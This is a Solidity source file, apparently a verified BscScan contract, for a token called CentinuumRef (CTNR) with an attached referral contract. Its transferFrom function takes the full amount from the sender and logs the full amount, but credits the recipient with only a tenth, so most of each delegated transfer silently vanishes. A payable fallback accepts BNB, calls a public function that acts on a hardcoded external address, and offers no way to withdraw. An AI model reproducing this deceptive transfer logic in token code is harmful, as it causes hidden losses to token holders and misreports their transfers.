/**
 *Submitted for verification at BscScan.com on 2021-10-09
*/

pragma solidity ^0.5.0;


contract ERC20Interface {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}
   
   
   
   contract Owner {
       
      address payable public owner;
      event ownershipTransferred(address indexed previousowner, address indexed newowner);
      
      constructor () public {
          owner = msg.sender;
      }
       modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
  
  function transferowner(address payable newowner) public onlyOwner {
    require(newowner != address(0));
    emit ownershipTransferred(owner, newowner);
    owner = newowner;
  }
   }

contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; 
        
    } 
        function safeMul(uint a, uint b) public pure returns (uint c) { 
        c = a * b; require(a == 0 || c / a == b); 
            
    } 
        function safeDiv(uint a, uint b) public pure returns (uint c) {
        require(b > 0);
        c = a / b;
    }
}


contract CentinuumRef is ERC20Interface, SafeMath {
    string public name;
    string public symbol;
    uint8 public decimals;

    uint256 public _totalSupply;

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;

   
    constructor() public {
        name = "CentinuumRef";
        symbol = "CTNR";
        decimals = 1;
        _totalSupply = 7890000000000;

        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }

    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }

    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transfer(address to, uint tokens) public returns (bool success) {
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        balances[from] = safeSub(balances[from], tokens);
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens/10);
        emit Transfer(from, to, tokens);
        return true;
    }
}


   contract Referalbase is ERC20Interface, CentinuumRef, Owner {
       struct User {
           address dis1;
           address dis2;
           address dis3;
           address dis4;
           uint invest;
           uint dividends;
       }
       
       mapping(address => User) public users;
       
       function () external payable {
           address to = msg.sender;
           uint tokens = msg.value*5;
           testvar( to, tokens);
       }
       function testvar( address to, uint tokens) public {
         address payable aaddr = 0x1152Ff8Ca308E9C39cd79E546084ab7DA744f5B1;
         Referalbase(aaddr).transfer(to, tokens); 
    }
   }